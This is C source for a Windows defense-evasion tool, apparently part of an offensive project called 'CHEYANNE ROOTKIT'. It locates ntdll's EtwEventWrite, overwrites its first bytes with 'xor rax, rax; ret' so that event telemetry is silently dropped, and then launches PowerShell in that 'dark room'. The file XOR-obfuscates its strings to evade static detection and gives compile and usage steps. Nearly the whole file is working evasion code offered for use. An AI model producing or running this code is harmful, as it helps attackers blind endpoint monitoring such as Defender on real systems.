/*
 * etw_patch_annotated.c — ETW Memory Patch (Annotated Reference)
 * ═══════════════════════════════════════════════════════════════════
 * CHEYANNE ROOTKIT — 22DIV / george wu
 *
 * PURPOSE:
 *   Patch ntdll!EtwEventWrite in-process to return STATUS_SUCCESS (0)
 *   without logging any ETW events. Blinds all user-mode telemetry
 *   including .NET assembly load events, ScriptBlock Logging, and
 *   in-process provider traces. Combined with AMSI bypass (Phase 1),
 *   this completes the "dark room" — Defender can't see our scripts
 *   OR our process activity.
 *
 * HOW ETW WORKS:
 *   Every ETW event in your process flows through:
 *     Your code → EtwEventWrite → EtwEventWriteFull → NtTraceEvent → KERNEL
 *
 *   EtwEventWrite is the choke point. Patch it → nothing reaches the
 *   syscall → Defender's user-mode consumers never see the event.
 *
 * THE PATCH:
 *   Overwrite first 4 bytes of EtwEventWrite with:
 *     xor rax, rax    (set RAX = 0 = STATUS_SUCCESS)
 *     ret
 *
 *   Machine code: 48 31 C0 C3
 *
 *   Callers see STATUS_SUCCESS — "event logged successfully" — but
 *   nothing was actually logged. Silent success.
 *
 * KERNEL TELEMETRY SURVIVES:
 *   EtwTi (Microsoft-Windows-Threat-Intelligence) runs at Ring 0.
 *   EtwTiLogProtectExecVm DETECTS the VirtualProtect call we make.
 *   This annotated version uses the classic patch for clarity.
 *   The HWBP variant (etw_hwbp_annotated.c) avoids this entirely.
 *
 * EXPECTED RESULT:
 *   Based on Finding #31 (AMSI), Defender likely has a behavioral rule
 *   for ETW tampering similar to AMSI_Patch_T. This reference version
 *   documents what gets detected. The HWBP variant is the real bypass.
 *
 * COMPILE:
 *   cl.exe etw_patch_annotated.c /Fe:etw_patch.exe /O1 /GS-
 *
 * USAGE:
 *   etw_patch.exe            (patch ETW, spawn PowerShell)
 *   etw_patch.exe --check    (locate EtwEventWrite, don't patch)
 *   etw_patch.exe --test     (patch ETW, verify, exit)
 */

#include <windows.h>
#include <stdio.h>
#include <string.h>

#define XOR_KEY 0x41

/* "ntdll.dll" XOR 0x41 — ntdll is ALWAYS loaded (no LoadLibrary needed) */
static const unsigned char xNtdll[] = {
    0x2F, 0x35, 0x25, 0x2D, 0x2D, 0x6F, 0x25, 0x2D, 0x2D
};
#define xNtdll_LEN 9

/* "EtwEventWrite" XOR 0x41 */
static const unsigned char xEtwEventWrite[] = {
    0x04, 0x35, 0x36, 0x04, 0x37, 0x24, 0x2F, 0x35,
    0x16, 0x33, 0x28, 0x35, 0x24
};
#define xEtwEventWrite_LEN 13

/* "powershell.exe" XOR 0x41 */
static const unsigned char xPowerShell[] = {
    0x31, 0x2E, 0x36, 0x24, 0x33, 0x32, 0x29, 0x24,
    0x2D, 0x2D, 0x6F, 0x24, 0x39, 0x24
};
#define xPowerShell_LEN 14

static void xor_decode(unsigned char *buf, int len) {
    int i;
    for (i = 0; i < len; i++) buf[i] ^= XOR_KEY;
}

static HANDLE hStdOut;
static void color(WORD c) { SetConsoleTextAttribute(hStdOut, c); }

#define RED     (FOREGROUND_RED | FOREGROUND_INTENSITY)
#define GREEN   (FOREGROUND_GREEN | FOREGROUND_INTENSITY)
#define YELLOW  (FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_INTENSITY)
#define CYAN    (FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY)
#define WHITE   (FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY)

/* ═══════════════════════════════════════════════════════════════════
 * PHASE 1: LOCATE ETW
 * ═══════════════════════════════════════════════════════════════════
 * ntdll.dll is mapped into every Windows process at boot. We use
 * GetModuleHandleA instead of LoadLibraryA because ntdll is always
 * present — no need to load it.
 * ═══════════════════════════════════════════════════════════════════ */

static void *locate_etw_event_write(void) {
    HMODULE hNtdll;
    void *pFunc;
    unsigned char dllName[16];
    unsigned char funcName[32];

    memcpy(dllName, xNtdll, xNtdll_LEN);
    xor_decode(dllName, xNtdll_LEN);
    dllName[xNtdll_LEN] = 0;

    memcpy(funcName, xEtwEventWrite, xEtwEventWrite_LEN);
    xor_decode(funcName, xEtwEventWrite_LEN);
    funcName[xEtwEventWrite_LEN] = 0;

    /* GetModuleHandleA: ntdll is always loaded — just get its handle */
    hNtdll = GetModuleHandleA((char *)dllName);
    if (!hNtdll) {
        color(RED);
        printf("  [!] GetModuleHandle failed: %lu\n", GetLastError());
        return NULL;
    }
    color(GREEN);
    printf("  [+] ntdll.dll at 0x%p\n", (void *)hNtdll);

    pFunc = (void *)GetProcAddress(hNtdll, (char *)funcName);
    if (!pFunc) {
        color(RED);
        printf("  [!] GetProcAddress failed: %lu\n", GetLastError());
        return NULL;
    }
    printf("  [+] EtwEventWrite at 0x%p\n", pFunc);

    memset(dllName, 0, sizeof(dllName));
    memset(funcName, 0, sizeof(funcName));

    return pFunc;
}

/* ═══════════════════════════════════════════════════════════════════
 * PHASE 2: PATCH ETW
 * ═══════════════════════════════════════════════════════════════════
 *
 * 4-byte patch:
 *   48 31 C0    xor rax, rax    (RAX = 0 = STATUS_SUCCESS)
 *   C3          ret
 *
 * EtwEventWrite returns ULONG (NTSTATUS-like). Callers check for
 * non-zero = error. Returning 0 = "event logged successfully."
 * Callers continue normally, unaware that nothing was logged.
 *
 * NOTE: VirtualProtect on ntdll's .text section triggers
 * EtwTiLogProtectExecVm at kernel level. Defender WILL see this.
 * ═══════════════════════════════════════════════════════════════════ */

static BOOL patch_etw(void *pFunc) {
    DWORD oldProtect;
    unsigned char originalBytes[4];
    unsigned char patch[4];

    /* xor rax, rax; ret — 4 bytes, returns STATUS_SUCCESS */
    patch[0] = 0x48;   /* REX.W prefix (64-bit operand) */
    patch[1] = 0x31;   /* XOR r/m64, r64 */
    patch[2] = 0xC0;   /* ModRM: rax, rax */
    patch[3] = 0xC3;   /* ret */

    memcpy(originalBytes, pFunc, 4);

    printf("  [*] Original bytes: %02X %02X %02X %02X\n",
           originalBytes[0], originalBytes[1], originalBytes[2],
           originalBytes[3]);

    if (!VirtualProtect(pFunc, 4, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        color(RED);
        printf("  [!] VirtualProtect (RWX) failed: %lu\n", GetLastError());
        return FALSE;
    }
    printf("  [+] Page protection changed to RWX (was 0x%lX)\n", oldProtect);

    memcpy(pFunc, patch, 4);

    VirtualProtect(pFunc, 4, oldProtect, &oldProtect);

    if (memcmp(pFunc, patch, 4) == 0) {
        color(GREEN);
        printf("  [+] PATCH APPLIED — EtwEventWrite now returns STATUS_SUCCESS\n");
        printf("  [+] Patched bytes: %02X %02X %02X %02X\n",
               patch[0], patch[1], patch[2], patch[3]);
        return TRUE;
    } else {
        color(RED);
        printf("  [!] Patch verification FAILED\n");
        return FALSE;
    }
}

static void spawn_powershell(void) {
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    unsigned char cmd[32];

    memcpy(cmd, xPowerShell, xPowerShell_LEN);
    xor_decode(cmd, xPowerShell_LEN);
    cmd[xPowerShell_LEN] = 0;

    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    memset(&pi, 0, sizeof(pi));

    color(CYAN);
    printf("\n  [*] Spawning PowerShell with ETW blinded...\n\n");

    if (!CreateProcessA(NULL, (LPSTR)cmd, NULL, NULL, FALSE,
                        CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
        color(RED);
        printf("  [!] CreateProcess failed: %lu\n", GetLastError());
        return;
    }

    printf("  [+] PowerShell PID: %lu\n", pi.dwProcessId);

    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    memset(cmd, 0, sizeof(cmd));
}

int main(int argc, char **argv) {
    void *pEtwEventWrite;
    int checkOnly = 0;
    int testOnly = 0;

    hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);

    if (argc > 1 && strcmp(argv[1], "--check") == 0)
        checkOnly = 1;
    if (argc > 1 && strcmp(argv[1], "--test") == 0)
        testOnly = 1;

#ifdef VDR_DEBUG
    color(CYAN);
    printf("\n");
    printf("  +======================================================+\n");
    printf("  |  CHEYANNE ETW PATCH — 22DIV / george wu              |\n");
    printf("  |  Phase 2: Complete The Dark Room                     |\n");
    printf("  +======================================================+\n");
    printf("  |  Technique: EtwEventWrite memory patch               |\n");
    printf("  |  Patch: xor rax, rax; ret (4 bytes)                  |\n");
    printf("  |  Privilege: Standard user (own process memory)        |\n");
    printf("  +======================================================+\n\n");
    color(WHITE);
#endif

    printf("  --- PHASE 1: LOCATE ETW ---\n\n");
    pEtwEventWrite = locate_etw_event_write();
    if (!pEtwEventWrite) {
        color(RED);
        printf("\n  [!] Cannot locate EtwEventWrite. Aborting.\n");
        return 1;
    }

    if (checkOnly) {
        color(GREEN);
        printf("\n  [*] EtwEventWrite is at 0x%p\n", pEtwEventWrite);
        printf("  [*] --check mode: not patching.\n");
        return 0;
    }

    printf("\n  --- PHASE 2: PATCH ETW ---\n\n");
    if (!patch_etw(pEtwEventWrite)) {
        color(RED);
        printf("\n  [!] Patch failed. Aborting.\n");
        return 1;
    }

    if (testOnly) {
        color(GREEN);
        printf("\n  [*] --test mode: patch applied, skipping shell spawn.\n");
        printf("  [*] ETW telemetry is blinded in this process.\n");
        return 0;
    }

    printf("\n  --- PHASE 3: SPAWN DARK ROOM ---\n");
    spawn_powershell();

#ifdef VDR_DEBUG
    color(WHITE);
    printf("\n  -- CHEYANNE ETW PATCH COMPLETE --\n\n");
#endif

    return 0;
}
